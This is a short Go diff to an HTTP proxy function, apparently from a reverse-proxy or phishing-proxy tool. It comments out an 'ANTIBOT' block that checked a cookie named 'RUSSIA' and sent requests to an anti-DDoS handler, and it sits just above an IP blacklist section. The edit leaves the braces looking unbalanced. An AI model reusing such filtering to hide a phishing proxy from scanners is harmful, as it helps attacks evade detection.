@@ -186,20 +186,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			log.Warning("REQ QUERY TOP: %s", req.URL)
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 
-			msg, err := req.Cookie("RUSSIA")
+			// ANTIBOT
 
 			//msg, err := req.Cookie("RUSSIA")
 			//
 			//if err != nil {
 			//	log.Error("msg: %v", err)
 			//	return p.antiddos(req, ps, req_url, "USA")
+			//
 			//} else {
+			//	if !p.isForwarderUrlBy2(req) {
 			//		return p.antiddos(req, ps, req_url, "USAt")
 			//	}
 			//	log.Important(msg.Value)
 			//}
 
-			} else {
 			// END ANTIBOT
 
 			// handle ip blacklist
